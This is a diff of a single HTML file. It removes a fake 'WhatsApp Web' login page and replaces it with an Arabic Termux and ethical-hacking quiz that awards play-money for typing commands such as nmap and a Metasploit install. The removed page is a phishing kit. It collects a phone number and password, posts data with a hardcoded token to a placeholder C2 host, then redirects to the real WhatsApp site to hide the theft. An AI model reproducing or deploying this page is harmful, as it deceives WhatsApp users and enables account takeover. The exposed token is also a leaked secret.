@@ -1,84 +1,105 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web</title>
+    <title>تعلم الهكر الأخلاقي والترمكس</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #d1d7db; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { width: 100%; max-width: 350px; background-color: #fff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .header { background-color: #008069; color: white; padding: 10px; display: flex; align-items: center; }
-        .avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #ddd; margin-right: 10px; }
-        .content { padding: 20px; }
-        .input-group { position: relative; margin-bottom: 15px; }
-        .input-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; outline: none; box-sizing: border-box; }
-        .input-group span { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: #008069; font-weight: bold; cursor: pointer; }
-        .btn { width: 100%; padding: 10px; background-color: #008069; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
-        .btn:hover { background-color: #005f4e; }
-        .loader { text-align: center; display: none; padding-top: 10px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #008069; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        :root { --bg: #ffffff; --text: #1a1a1a; --card: #f0f0f0; --primary: #00ff66; --btn-bg: #222; --btn-text: #fff; }
+        [data-theme="dark"] { --bg: #0d0d0d; --text: #ffffff; --card: #1a1a1a; --primary: #00ff66; --btn-bg: #fff; --btn-text: #000; }
+        body { background-color: var(--bg); color: var(--text); font-family: Arial, sans-serif; transition: 0.3s; margin: 0; padding: 20px; text-align: center; }
+        header { display: flex; justify-content: space-between; align-items: center; max-width: 800px; margin: 0 auto 30px; }
+        .theme-btn { padding: 10px 20px; cursor: pointer; border: none; background: var(--btn-bg); color: var(--btn-text); font-weight: bold; border-radius: 5px; }
+        .balance { font-size: 1.2rem; font-weight: bold; color: var(--primary); border: 2px dashed var(--primary); padding: 5px 15px; border-radius: 5px; }
+        .container { max-width: 800px; margin: 0 auto; display: grid; gap: 20px; }
+        .card { background: var(--card); border: 1px solid #333; padding: 20px; border-radius: 8px; text-align: right; position: relative; }
+        .card h3 { margin-top: 0; color: var(--primary); }
+        .code-box { background: #000; color: #00ff66; padding: 10px; font-family: monospace; border-radius: 4px; direction: ltr; text-align: left; overflow-x: auto; }
+        .quiz-zone { margin-top: 15px; display: flex; gap: 10px; align-items: center; }
+        input [type="text"] { padding: 8px; border: 1px solid #444; border-radius: 4px; background: var(--bg); color: var(--text); flex: 1; }
+        .action-btn { padding: 8px 15px; border: none; background: var(--primary); color: #000; font-weight: bold; cursor: pointer; border-radius: 4px; }
+        .action-btn:disabled { background: #555; cursor: not-allowed; color: #aaa; }
     </style>
 </head>
 <body>
+
+    <header>
+        <h1>أكاديمية السايبر والترمكس 🛡️</h1>
+        <div>
+            <span class="balance">رصيدك: <span id="money">0</span>$</span>
+            <button class="theme-btn" onclick="toggleTheme()" id="themeBtn">الوضع الليلي 🌙</button>
+        </div>
+    </header>
+
     <div class="container">
-        <div class="header">
-            <div class="avatar"></div>
-            <div>
-                <h3 style="margin: 0;">WhatsApp Web</h3>
-                <small style="opacity: 0.8;">Send and receive messages without keeping your phone online.</small>
+        <!-- الدرس الأول -->
+        <div class="card">
+            <h3>الدرس 1: تحديث حزم الترمكس (Termux)</h3>
+            <p>قبل البدء بأي عملية اختراق أخلاقي، يجب تحديث النظام داخل ترمكس لضمان عمل الأدوات بكفاءة ولتجنب الأخطاء المستمرة.</p>
+            <div class="code-box">pkg update && pkg upgrade -y</div>
+            <div class="quiz-zone">
+                <input type="text" id="ans1" placeholder="اكتب الأمر البرمجي للتحديث هنا...">
+                <button class="action-btn" id="btn1" onclick="checkAnswer(1, 'pkg update && pkg upgrade -y', 50)">تحقق واربح 50$</button>
             </div>
         </div>
-        <div class="content">
-            <div class="input-group">
-                <input type="text" id="phone" placeholder="Phone Number (e.g., 1234567890)">
-                <span>+</span>
+
+        <!-- الدرس الثاني -->
+        <div class="card">
+            <h3>الدرس 2: فحص المنافذ باستخدام Nmap</h3>
+            <p>أداة Nmap تستخدم لفحص الشبكات ومعرفة المنافذ المفتوحة (Ports) والثغرات داخل الأجهزة المستهدفة.</p>
+            <div class="code-box">nmap -sV target.com</div>
+            <div class="quiz-zone">
+                <input type="text" id="ans2" placeholder="ما هو أمر فحص الإصدارات في Nmap؟...">
+                <button class="action-btn" id="btn2" onclick="checkAnswer(2, 'nmap -sV target.com', 100)">تحقق واربح 100$</button>
             </div>
-            <div class="input-group">
-                <input type="password" id="password" placeholder="Password">
-            </div>
-            <button class="btn" onclick="submitData()">SEND</button>
-            <div class="loader" id="loader">
-                <span class="spinner"></span> Verifying...
+        </div>
+
+        <!-- الدرس الثالث -->
+        <div class="card">
+            <h3>الدرس 3: تثبيت أداة Metasploit</h3>
+            <p>مشروع ميتاسبلويت هو أشهر إطار عمل لإنشاء واختبار استغلالات الثغرات الأمنية في أنظمة التشغيل المختلفة.</p>
+            <div class="code-box">pkg install metasploit</div>
+            <div class="quiz-zone">
+                <input type="text" id="ans3" placeholder="اكتب أمر تثبيت الميتاسبلويت...">
+                <button class="action-btn" id="btn3" onclick="checkAnswer(3, 'pkg install metasploit', 150)">تحقق واربح 150$</button>
             </div>
         </div>
     </div>
 
     <script>
-        function submitData() {
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-            const loader = document.getElementById('loader');
-            
-            // التحقق من البيانات
-            if(phone && password) {
-                loader.style.display = 'block';
-                
-                // إرسال البيانات (Mock Data to a server)
-                // في التطبيق الحقيقي، ستقوم بإنشاء سيرفر لاستقبال البيانات هنا
-                const data = {
-                    target_phone: phone,
-                    token: "8743838022:AAFfV3RHCa3svISVMtuTTnPcVRxF1kCthgk", // الرمز الذي زودتني به
-                    timestamp: new Date().toISOString()
-                };
+        let balance = parseInt(localStorage.getItem('cyber_balance')) || 0;
+        document.getElementById('money').innerText = balance;
+        
+        // استعادة الوضع المحفوظ (ليلي/نهاري)
+        if (localStorage.getItem('theme') === 'dark') {
+            document.documentElement.setAttribute('data-theme', 'dark');
+            document.getElementById('themeBtn').innerText = "الوضع النهاري ☀️";
+        }
 
-                // محاكاة عملية الإرسال باستخدام fetch (يستهلك بيانات ضئيلة جداً)
-                fetch('https://your-c2-server.com/api/receive', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                })
-                .then(response => {
-                    setTimeout(() => {
-                        loader.style.display = 'none';
-                        alert('Data Sent Successfully!');
-                        window.location.href = "https://web.whatsapp.com/";
-                    }, 1500);
-                })
-                .catch(error => {
-                    loader.style.display = 'none';
-                    alert('Error sending data. Try again.');
-                });
+        function toggleTheme() {
+            const currentTheme = document.documentElement.getAttribute('data-theme');
+            if (currentTheme === 'dark') {
+                document.documentElement.removeAttribute('data-theme');
+                localStorage.setItem('theme', 'light');
+                document.getElementById('themeBtn').innerText = "الوضع الليلي 🌙";
+            } else {
+                document.documentElement.setAttribute('data-theme', 'dark');
+                localStorage.setItem('theme', 'dark');
+                document.getElementById('themeBtn').innerText = "الوضع النهاري ☀️";
+            }
+        }
+
+        function checkAnswer(lessonId, correctAns, reward) {
+            const userAns = document.getElementById(`ans${lessonId}`).value.trim();
+            if (userAns === correctAns) {
+                balance += reward;
+                localStorage.setItem('cyber_balance', balance);
+                document.getElementById('money').innerText = balance;
+                document.getElementById(`btn${lessonId}`).disabled = true;
+                document.getElementById(`btn${lessonId}`).innerText = "تم الحل بنجاح! +";
+                alert(`أحسنت! الإجابة صحيحة وتم إضافة ${reward}$ إلى رصيدك.`);
+            } else {
+                alert("إجابة خاطئة! انسخ الكود بدقة وجربه مرة أخرى.");
             }
         }
     </script>
